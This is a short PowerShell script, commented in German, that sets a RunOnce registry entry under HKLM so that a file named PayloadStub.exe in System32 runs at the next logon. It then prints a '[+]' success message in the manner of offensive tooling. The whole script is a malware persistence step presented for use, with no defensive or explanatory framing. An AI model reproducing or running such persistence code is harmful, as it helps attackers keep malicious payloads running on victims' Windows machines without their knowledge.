# PowerShell-Skript: RunOnce-Eintrag setzen für Payload im System32
$payload = "$env:windir\\System32\\PayloadStub.exe"

Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" `
                 -Name "81a5_payload" `
                 -Value $payload
Write-Host "[+] RunOnce-Eintrag gesetzt: $payload"
